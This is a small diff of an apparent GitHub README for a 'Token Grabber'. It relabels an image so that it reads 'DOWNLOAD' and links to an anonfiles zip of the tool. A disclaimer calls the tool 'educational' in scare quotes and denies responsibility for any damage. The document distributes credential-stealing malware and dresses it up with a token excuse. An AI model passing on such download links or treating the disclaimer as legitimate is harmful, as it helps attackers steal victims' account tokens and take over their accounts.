@@ -9,7 +9,7 @@
 - [Contact me](#contact-me)
 
 GRABBER DOWNLOAD:
-   [![Blankrypt](https://cdn.pixabay.com/photo/2022/12/07/17/41/download-7641614__340.pngr)](https://anonfiles.com/e3c064R6yf/HAV-Vs_Token_Grabber_zip)
+   [![DOWNLOAD](https://cdn.pixabay.com/photo/2022/12/07/17/41/download-7641614__340.pngr)](https://anonfiles.com/e3c064R6yf/HAV-Vs_Token_Grabber_zip)
 
 
 **Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
